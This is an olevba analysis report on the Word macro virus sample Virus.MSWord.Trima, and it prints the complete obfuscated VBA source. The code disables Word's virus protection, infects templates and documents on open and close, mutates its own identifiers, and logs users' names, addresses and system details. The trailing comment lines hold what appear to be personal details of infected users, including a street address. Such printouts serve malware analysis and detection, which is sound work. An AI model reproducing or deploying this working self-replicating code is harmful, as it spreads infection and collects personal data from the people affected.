olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trima
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trima - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'dseÀÝÀg˜gzÅzÙEÙÇYÇ×•×À°ÀHpHûbûÔÔÀµÀô:ôzFzh`hzÔzù¼ùRƒRÀfÀé:é0Ð0b‰b1ä1À7ÀzYzÙWÙHjHPMPäbä_“_
'×ÀÀzzæHâîÙNz÷
'éz9ùP9zÀäPÀÀz
'ÇÌzzñïÀA1tÕAwÀ
'ZEÐHÀZZêzNzzz9
'AzzegÌzzÙzÈolÀ
'UÀ1zçzz3
'ÈÇÀXÀÕ3ó
'JÀ3ÀÒÀÀÀzzzP
'wARzzÀeÀzÇÀe8
'ÍÀz_çÀáÀñ
'HqSgzlRÀÚÂübyÝÀ
'zqäAÀdîÀÀÀzzeÌt
'AeÀz6îzÝzdWzözzÀzz
'ZÀz4ÌîAzÂb
'ÕÀHhAÒzqÀ
'zPlWzÃAÀÀ1üÝçP
'zÀÀáuÀÂûÂÀÀz
'ÒÀß9ÀzzqÀ
'zÊz8ÀyßìÐôrùz
'H__öÀÀjhu_æÀ
'ÅzÀìîÀ9ìdÕæSÀÀz
'N÷âÀézzÀEj×zgw_ÀH
'ÂÀKzÀÀzÀmÀJÅAÚÀá
'aîâÀqzzô_Àî÷zK÷Ý98ÀjH
'÷âÀUttÀÀgz×1Ày9Àzñz
'Àz8ÐÀÀ4ÊCÀz6zzuzRê0
'zâÀùêÀ
'zâÀùêÀ_
'ÌHzEhM
'ÌHzEhM_
'ÀïzÀÀÀzÊ
'zb9hÙ9z
'F1ÀÀñþÀz
'zÀqÒezáÀw
'NÀRÀzî9ü
'ugSqÀyM6Ê
'éozWüôöz
'ÀÅ÷ÇzzzÈ
'zÀÀÈ_Ã
'zJCP0ÀùNz
'uáUzáhhzÀÅzzù
'zÀÀ0ÀçÚ
'ÀF×ÀzÊìÀ9
'zÜ9zÀSzM
'ïÊÏzÀö3
'dÂÀ_ÀâÀÀENÌÀÐ
'dwzUqÀÃÅó
Private ×ÀÀzzæHâîÙNz÷, éz9ùP9zÀäPÀÀz, ÇÌzzñïÀA1tÕAwÀ, ZEÐHÀZZêzNzzz9, AzzegÌzzÙzÈolÀ, UÀ1zçzz3$(47, 2), ÈÇÀXÀÕ3ó, JÀ3ÀÒÀÀÀzzzP$, wARzzÀeÀzÇÀe8$, ÍÀz_çÀáÀñ$
Private HqSgzlRÀÚÂübyÝÀ As Object
Private zqäAÀdîÀÀÀzzeÌt As Object
Private Sub Document_Open()
 On Error Resume Next
 Options.VirusProtection = False
 Set zqäAÀdîÀÀÀzzeÌt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
 For dÂÀ_ÀâÀÀENÌÀÐ = 1 To Application.Templates.Count
  Set HqSgzlRÀÚÂübyÝÀ = Application.Templates.Item(dÂÀ_ÀâÀÀENÌÀÐ).VBProject.VBComponents.Item(1).codemodule
  AeÀz6îzÝzdWzözzÀzz
  If ×ÀÀzzæHâîÙNz÷ > éz9ùP9zÀäPÀÀz Then ÂÀKzÀÀzÀmÀJÅAÚÀá HqSgzlRÀÚÂübyÝÀ
  If ×ÀÀzzæHâîÙNz÷ < éz9ùP9zÀäPÀÀz Then ÂÀKzÀÀzÀmÀJÅAÚÀá zqäAÀdîÀÀÀzzeÌt
  Set HqSgzlRÀÚÂübyÝÀ = Nothing
 Next dÂÀ_ÀâÀÀENÌÀÐ
 Set zqäAÀdîÀÀÀzzeÌt = Nothing
End Sub
Private Sub Document_Close()
 On Error Resume Next
 Options.VirusProtection = False
 ÍÀz_çÀáÀñ$ = zÊz8ÀyßìÐôrùz$
 ÷âÀUttÀÀgz×1Ày9Àzñz ÍÀz_çÀáÀñ$, Chr(10), " "
 ÷âÀUttÀÀgz×1Ày9Àzñz ÍÀz_çÀáÀñ$, Chr(13), " "
 Set zqäAÀdîÀÀÀzzeÌt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
 For dÂÀ_ÀâÀÀENÌÀÐ = 1 To Application.Templates.Count
  Set HqSgzlRÀÚÂübyÝÀ = Application.Templates.Item(dÂÀ_ÀâÀÀENÌÀÐ).VBProject.VBComponents.Item(1).codemodule
  AeÀz6îzÝzdWzözzÀzz
  If ×ÀÀzzæHâîÙNz÷ > éz9ùP9zÀäPÀÀz Then
   Àz8ÐÀÀ4ÊCÀz6zzuzRê0 zqäAÀdîÀÀÀzzeÌt, HqSgzlRÀÚÂübyÝÀ, ÇÌzzñïÀA1tÕAwÀ, ×ÀÀzzæHâîÙNz÷
   Application.Templates.Item(dÂÀ_ÀâÀÀENÌÀÐ).Save
  End If
  If (×ÀÀzzæHâîÙNz÷ < éz9ùP9zÀäPÀÀz) And (Mid(ActiveDocument.Name, 1, 8) <> "Äîêóìåíò") And (Mid(ActiveDocument.Name, 1, 3) <> "Doc") And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   Document_saved = ActiveDocument.Saved
   Àz8ÐÀÀ4ÊCÀz6zzuzRê0 HqSgzlRÀÚÂübyÝÀ, zqäAÀdîÀÀÀzzeÌt, ZEÐHÀZZêzNzzz9, éz9ùP9zÀäPÀÀz
   If Document_saved Then ActiveDocument.Save
  End If
  Set HqSgzlRÀÚÂübyÝÀ = Nothing
 Next dÂÀ_ÀâÀÀENÌÀÐ
 Set zqäAÀdîÀÀÀzzeÌt = Nothing
End Sub
Private Sub AeÀz6îzÝzdWzözzÀzz()
 ×ÀÀzzæHâîÙNz÷ = N÷âÀézzÀEj×zgw_ÀH(zqäAÀdîÀÀÀzzeÌt)
 If ×ÀÀzzæHâîÙNz÷ >= 1 Then ÇÌzzñïÀA1tÕAwÀ = AzzegÌzzÙzÈolÀ
 éz9ùP9zÀäPÀÀz = N÷âÀézzÀEj×zgw_ÀH(HqSgzlRÀÚÂübyÝÀ)
 If éz9ùP9zÀäPÀÀz >= 1 Then ZEÐHÀZZêzNzzz9 = AzzegÌzzÙzÈolÀ
End Sub
Private Function ZÀz4ÌîAzÂb(zâÀùêÀ_$, ÌHzEhM_$) As Boolean
 If Len(zâÀùêÀ_$) < Len(ÌHzEhM_$) Then
  zâÀùêÀ$ = ÌHzEhM_$
  ÌHzEhM$ = zâÀùêÀ_$
 Else
  zâÀùêÀ$ = zâÀùêÀ_$
  ÌHzEhM$ = ÌHzEhM_$
 End If
 ZÀz4ÌîAzÂb = False
 For ÈÇÀXÀÕ3ó = 1 To Len(zâÀùêÀ$) - Len(ÌHzEhM$) + 1
  If Mid(zâÀùêÀ$, ÈÇÀXÀÕ3ó, Len(ÌHzEhM$)) = ÌHzEhM$ Then
   ZÀz4ÌîAzÂb = True
   Exit Function
  End If
 Next ÈÇÀXÀÕ3ó
End Function
Private Function ÕÀHhAÒzqÀ(ÀïzÀÀÀzÊ, zb9hÙ9z)
 F1ÀÀñþÀz = ÀïzÀÀÀzÊ
 For zÜ9zÀSzM = 1 To zb9hÙ9z - 1
  F1ÀÀñþÀz = F1ÀÀñþÀz \ 10
 Next zÜ9zÀSzM
 ÕÀHhAÒzqÀ = F1ÀÀñþÀz Mod 10
End Function
Private Function zPlWzÃAÀÀ1üÝçP(zÀqÒezáÀw, NÀRÀzî9ü)
 If NÀRÀzî9ü < 1 Then NÀRÀzî9ü = 1
 zÀqÒezáÀw = zÀqÒezáÀw + 3 * NÀRÀzî9ü ^ 2 + 5 * NÀRÀzî9ü + 7
 While zÀqÒezáÀw > 255
  zÀqÒezáÀw = zÀqÒezáÀw - 255
 Wend
 If zÀqÒezáÀw < 48 Then zÀqÒezáÀw = zÀqÒezáÀw + 48
 zPlWzÃAÀÀ1üÝçP = zÀqÒezáÀw
End Function
Private Function zÀÀáuÀÂûÂÀÀz(zÀqÒezáÀw, NÀRÀzî9ü, ugSqÀyM6Ê)
 If NÀRÀzî9ü < 1 Then NÀRÀzî9ü = 1
 zÀqÒezáÀw = zÀqÒezáÀw + ÕÀHhAÒzqÀ(ugSqÀyM6Ê, NÀRÀzî9ü)
 If zÀqÒezáÀw > 255 Then zÀqÒezáÀw = zÀqÒezáÀw - 190
 zÀÀáuÀÂûÂÀÀz = zÀqÒezáÀw
End Function
Private Function ÒÀß9ÀzzqÀ$(ugSqÀyM6Ê)
 ÒÀß9ÀzzqÀ$ = ""
 For zÜ9zÀSzM = 1 To 30
  éozWüôöz$ = H__öÀÀjhu_æÀ$(1)
  ÒÀß9ÀzzqÀ$ = ÒÀß9ÀzzqÀ$ + éozWüôöz$ + Chr(zPlWzÃAÀÀ1üÝçP(Asc(éozWüôöz$), zÜ9zÀSzM)) + Chr(zÀÀáuÀÂûÂÀÀz(Asc(éozWüôöz$), zÜ9zÀSzM, ugSqÀyM6Ê))
 Next zÜ9zÀSzM
End Function
Private Function zÊz8ÀyßìÐôrùz$()
 zÊz8ÀyßìÐôrùz$ = "'" + Trim(Application.UserName)
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(Application.UserInitials)
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(Application.UserAddress)
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(Str(System.Country))
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + System.LanguageDesignation
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(Application.Version)
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(System.OperatingSystem)
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + System.Version
 zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "%" + Trim(System.ProcessorType)
 If System.MathCoprocessorInstalled Then
  zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "+"
 Else
  zÊz8ÀyßìÐôrùz$ = zÊz8ÀyßìÐôrùz$ + "-"
 End If
End Function
Private Function H__öÀÀjhu_æÀ$(ugSqÀyM6Ê)
 H__öÀÀjhu_æÀ$ = ""
 For zÜ9zÀSzM = 1 To ugSqÀyM6Ê
  F1ÀÀñþÀz = Timer + Rnd
  zÀqÒezáÀw = Int(48 + (F1ÀÀñþÀz - Int(F1ÀÀñþÀz)) * 208)
  If zÀqÒezáÀw < 48 Then zÀqÒezáÀw = 48
  If (zÀqÒezáÀw > 57) And (zÀqÒezáÀw < 65) And (zÀqÒezáÀw <= 61) Then zÀqÒezáÀw = 57
  If (zÀqÒezáÀw > 57) And (zÀqÒezáÀw < 65) And (zÀqÒezáÀw > 61) Then zÀqÒezáÀw = 65
  If (zÀqÒezáÀw > 90) And (zÀqÒezáÀw < 97) Then zÀqÒezáÀw = 95
  If (zÀqÒezáÀw > 122) And (zÀqÒezáÀw < 192) And (zÀqÒezáÀw <= 157) Then zÀqÒezáÀw = 122
  If (zÀqÒezáÀw > 122) And (zÀqÒezáÀw < 192) And (zÀqÒezáÀw > 157) Then zÀqÒezáÀw = 192
  If zÀqÒezáÀw > 255 Then zÀqÒezáÀw = 255
  If (zÜ9zÀSzM = 1) And (ugSqÀyM6Ê > 1) And (zÀqÒezáÀw <= 57) Then zÀqÒezáÀw = 97
  If (zÜ9zÀSzM = 1) And (ugSqÀyM6Ê > 1) And (zÀqÒezáÀw = 95) Then zÀqÒezáÀw = 97
  H__öÀÀjhu_æÀ$ = H__öÀÀjhu_æÀ$ + Chr(zÀqÒezáÀw)
 Next zÜ9zÀSzM
End Function
Private Function ÅzÀìîÀ9ìdÕæSÀÀz(ÀÅ÷ÇzzzÈ$)
 If Len(ÀÅ÷ÇzzzÈ$) = 90 Then
  ÅzÀìîÀ9ìdÕæSÀÀz = 0
  For F1ÀÀñþÀz = 30 To 1 Step -1
   éozWüôöz$ = Mid(ÀÅ÷ÇzzzÈ$, F1ÀÀñþÀz * 3 - 2, 1)
   If Asc(Mid(ÀÅ÷ÇzzzÈ$, F1ÀÀñþÀz * 3 - 1, 1)) <> zPlWzÃAÀÀ1üÝçP(Asc(éozWüôöz$), F1ÀÀñþÀz) Then
    ÅzÀìîÀ9ìdÕæSÀÀz = -1
    Exit Function
   End If
   ÅzÀìîÀ9ìdÕæSÀÀz = ÅzÀìîÀ9ìdÕæSÀÀz * 10
   ÅzÀìîÀ9ìdÕæSÀÀz = ÅzÀìîÀ9ìdÕæSÀÀz + Abs(Asc(Mid(ÀÅ÷ÇzzzÈ$, F1ÀÀñþÀz * 3, 1)) - Asc(éozWüôöz$))
   If Abs(Asc(Mid(ÀÅ÷ÇzzzÈ$, F1ÀÀñþÀz * 3, 1)) - Asc(éozWüôöz$)) > 10 Then
    ÅzÀìîÀ9ìdÕæSÀÀz = ÅzÀìîÀ9ìdÕæSÀÀz - 190
   End If
  Next F1ÀÀñþÀz
 Else
  ÅzÀìîÀ9ìdÕæSÀÀz = -1
 End If
End Function
Private Function N÷âÀézzÀEj×zgw_ÀH(ïÊÏzÀö3 As Object)
 N÷âÀézzÀEj×zgw_ÀH = -2
 AzzegÌzzÙzÈolÀ = -1
 For AzzegÌzzÙzÈolÀ = 1 To ïÊÏzÀö3.countoflines
  JÀ3ÀÒÀÀÀzzzP$ = ïÊÏzÀö3.lines(AzzegÌzzÙzÈolÀ, 1)
  If (Len(JÀ3ÀÒÀÀÀzzzP$) = 91) And (Mid(JÀ3ÀÒÀÀÀzzzP$, 1, 1) = "'") Then
   JÀ3ÀÒÀÀÀzzzP$ = Mid(JÀ3ÀÒÀÀÀzzzP$, 2, Len(JÀ3ÀÒÀÀÀzzzP$) - 1)
   If ÅzÀìîÀ9ìdÕæSÀÀz(JÀ3ÀÒÀÀÀzzzP$) > N÷âÀézzÀEj×zgw_ÀH Then
    N÷âÀézzÀEj×zgw_ÀH = ÅzÀìîÀ9ìdÕæSÀÀz(JÀ3ÀÒÀÀÀzzzP$)
    If N÷âÀézzÀEj×zgw_ÀH >= 1 Then
     Exit Function
    End If
   End If
  End If
 Next AzzegÌzzÙzÈolÀ
End Function
Private Sub ÂÀKzÀÀzÀmÀJÅAÚÀá(ïÊÏzÀö3 As Object)
 ïÊÏzÀö3.DeleteLines 1, ïÊÏzÀö3.countoflines
End Sub
Private Sub aîâÀqzzô_Àî÷zK÷Ý98ÀjH(ïÊÏzÀö3 As Object, ugSqÀyM6Ê)
 JÀ3ÀÒÀÀÀzzzP$ = ïÊÏzÀö3.lines(ugSqÀyM6Ê, 1)
 For F1ÀÀñþÀz = 0 To 46
  UÀ1zçzz3$(F1ÀÀñþÀz, 0) = Mid(ïÊÏzÀö3.lines(ugSqÀyM6Ê + F1ÀÀñþÀz, 1), 2, Len(ïÊÏzÀö3.lines(ugSqÀyM6Ê + F1ÀÀñþÀz, 1)) - 1)
  UÀ1zçzz3$(F1ÀÀñþÀz, 1) = H__öÀÀjhu_æÀ$(Len(UÀ1zçzz3$(F1ÀÀñþÀz, 0)))
  zÀqÒezáÀw = 0
  While zÀqÒezáÀw < F1ÀÀñþÀz
   If ZÀz4ÌîAzÂb(UÀ1zçzz3$(F1ÀÀñþÀz, 1), UÀ1zçzz3$(j, 1)) Or ZÀz4ÌîAzÂb(UÀ1zçzz3$(F1ÀÀñþÀz, 1), UÀ1zçzz3$(j, 0)) Or ZÀz4ÌîAzÂb(UÀ1zçzz3$(F1ÀÀñþÀz, 1), JÀ3ÀÒÀÀÀzzzP$) Then
    UÀ1zçzz3$(i, 1) = H__öÀÀjhu_æÀ$(Len(UÀ1zçzz3$(i, 0)))
    zÀqÒezáÀw = 0
   Else
    zÀqÒezáÀw = zÀqÒezáÀw + 1
   End If
  Wend
 Next F1ÀÀñþÀz
End Sub
Private Sub ÷âÀUttÀÀgz×1Ày9Àzñz(zâÀùêÀ$, zJCP0ÀùNz$, uáUzáhhzÀÅzzù$)
 zÀÀÈ_Ã$ = ""
 While ZÀz4ÌîAzÂb(zâÀùêÀ$, zJCP0ÀùNz$)
  zÀÀÈ_Ã$ = Mid(zâÀùêÀ$, 1, ÈÇÀXÀÕ3ó - 1) + uáUzáhhzÀÅzzù$ + Mid(zâÀùêÀ$, ÈÇÀXÀÕ3ó + Len(zJCP0ÀùNz$), Len(zâÀùêÀ$) - ÈÇÀXÀÕ3ó - Len(zJCP0ÀùNz$) + 1)
  zâÀùêÀ$ = zÀÀÈ_Ã$
 Wend
End Sub
Private Sub Àz8ÐÀÀ4ÊCÀz6zzuzRê0(zÀÀ0ÀçÚ As Object, ïÊÏzÀö3 As Object, ÀF×ÀzÊìÀ9, zÜ9zÀSzM)
 aîâÀqzzô_Àî÷zK÷Ý98ÀjH zÀÀ0ÀçÚ, ÀF×ÀzÊìÀ9 + 1
 dwzUqÀÃÅó = 1
 For AzzegÌzzÙzÈolÀ = 1 To zÀÀ0ÀçÚ.countoflines
  zâÀùêÀ$ = zÀÀ0ÀçÚ.lines(AzzegÌzzÙzÈolÀ, 1)
  For zÀqÒezáÀw = 0 To 46
   ÷âÀUttÀÀgz×1Ày9Àzñz zâÀùêÀ$, UÀ1zçzz3$(zÀqÒezáÀw, 0), UÀ1zçzz3$(zÀqÒezáÀw, 1)
  Next zÀqÒezáÀw
  If AzzegÌzzÙzÈolÀ = ÀF×ÀzÊìÀ9 Then
   Do
    zâÀùêÀ$ = ÒÀß9ÀzzqÀ$(zÜ9zÀSzM)
   Loop Until ÅzÀìîÀ9ìdÕæSÀÀz(zâÀùêÀ$) = zÜ9zÀSzM
   zâÀùêÀ$ = "'" + zâÀùêÀ$
  End If
  If Trim(zâÀùêÀ$) <> "" Then ïÊÏzÀö3.insertlines AzzegÌzzÙzÈolÀ, zâÀùêÀ$
  If Trim(zâÀùêÀ$) = "End Sub" Then dwzUqÀÃÅó = AzzegÌzzÙzÈolÀ
 Next AzzegÌzzÙzÈolÀ
 For AzzegÌzzÙzÈolÀ = dwzUqÀÃÅó + 1 To zÀÀ0ÀçÚ.countoflines
  zâÀùêÀ$ = zÀÀ0ÀçÚ.lines(AzzegÌzzÙzÈolÀ, 1)
  If zâÀùêÀ$ = ÍÀz_çÀáÀñ$ Then Exit Sub
 Next AzzegÌzzÙzÈolÀ
 ïÊÏzÀö3.insertlines zÀÀ0ÀçÚ.countoflines + 1, ÍÀz_çÀáÀñ$
End Sub
'Îíèì%À.Í.%%7%Ðóññêèé%8.0%Windows%4.10%Pentium+
'Êîìèññàðîâà Àíãåëèíà%À.Â.%Óë. Êîñì. Êîìàðîâà Ä.63, êâ. 7  414011%7%Ðóññêèé%8.0%Windows%4.10%Pentium+
'Alex%A%%7%Ðóññêèé%8.0b%Windows%4.10%Pentium+
'Êîðïîðàòèâíàÿ óñòàíîâêà%Êó%%7%Russian%8.0b%Windows NT%4.0%Pentium+
'referent%r%%7%Ðóññêèé%8.0%Windows NT%4.0%Pentium+
'orybakova%or%%7%Ðóññêèé%8.0%Windows NT%4.0%Pentium+
'alla%a%%7%Ðóññêèé%8.0%Windows NT%4.0%Pentium+
'Replication System%RS%%44%English (United Kingdom)%8.0%Windows NT%4.0%Pentium+
'Harry H.%HH%%1%English (United States)%8.0%Windows%4.10%Pentium+
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

